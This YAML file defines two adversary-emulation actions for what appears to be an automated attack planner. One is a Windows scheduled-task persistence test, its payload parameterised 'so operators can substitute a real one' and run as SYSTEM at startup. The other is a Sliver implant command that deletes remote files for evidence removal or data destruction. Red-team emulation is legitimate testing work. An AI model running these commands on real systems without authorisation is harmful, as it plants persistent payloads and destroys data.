  - uuid: art-t1053_005-schtasks-onstart
    name: Scheduled Task Startup Script
    id:
      - T1053.005
    source: Atomic Red Team
    supported_platforms:
      - windows
    tactics:
      - Persistence
    technique:
      - 'Scheduled Task/Job: Scheduled Task'
    description: |
      Creates a scheduled task that fires at logon and a second task that
      fires at system startup running as SYSTEM. Classic persistence via
      Task Scheduler. Original ART test hardcodes calc.exe as the payload;
      parameterised here so operators can substitute a real one. ART
      auto_generated_guid fec27f65-db86-4c2d-b66c-61945aee87c2.
    execution:
      executor: Command Prompt Executor
      command: |
        schtasks /create /tn "#{task_name_logon}" /sc onlogon /tr "#{task_command}"
        schtasks /create /tn "#{task_name_startup}" /sc onstart /ru system /tr "#{task_command}"
    arguments:
      executor:
        description: The Command Prompt session ID used to invoke schtasks.
        required: true
        pddl_index: executor0_var_in_plan
      task_name_logon:
        default: T1053_005_OnLogon
        description: Name of the scheduled task firing at user logon.
        required: true
      task_name_startup:
        default: T1053_005_OnStartup
        description: Name of the scheduled task firing at system startup.
        required: true
      task_command:
        default: cmd.exe /c C:\Users\Public\payload.exe
        description: Command line the scheduled tasks execute.
        required: true
        pddl_index: string2_var_in_plan
    preconditions:
      - (os-windows ?target - host)
      - (command-prompt ?executorID - executor ?target - host)
      - (elevated-executor ?executorID - executor)
    effects:
      - (command-execution-at-startup ?c - string ?target - host)
  - uuid: sliver-rm
    name: Remove Remote Path
    id:
      - T1070.004
      - T1485
    source: Sliver
    supported_platforms:
      - windows
      - linux
      - macos
    tactics:
      - Defense Evasion
      - Impact
    technique:
      - |
        Indicator Removal: File Deletion
      - Data Destruction
    description: The `rm(remote_path, recursive=False, force=False)` command removes
      a directory or file(s) from the remote system. Parameters include remote_path
      (remote path), recursive (recursively remove file(s)), and force (forcefully
      remove the file(s)).
    execution:
      executor: Sliver Executor
      command: |
        rm(session_id=#{executor}, remote_path=#{RemotePath}, recursive=#{Recursive}, force=#{Force})
    arguments:
      executor:
        description: The session ID of the active Sliver connection.
        required: true
        pddl_index: executor1_var_in_plan
      RemotePath:
        description: Remote path
        required: true
        pddl_index: string1_var_in_plan
      Recursive:
        description: Recursively remove file(s)
        required: true
      Force:
        description: Forcefully remove the file(s)
        required: true
    preconditions:
      - operator: or
        operands:
          - (os-windows ?target - host)
          - (os-linux ?target - host)
          - (os-macos ?target - host)
      - (sliver-session ?executorID - executor ?target - host)
      - (file-exists ?path - string ?f - file ?target - host)
    effects:
      - (file-deleted ?f - file ?target - host)
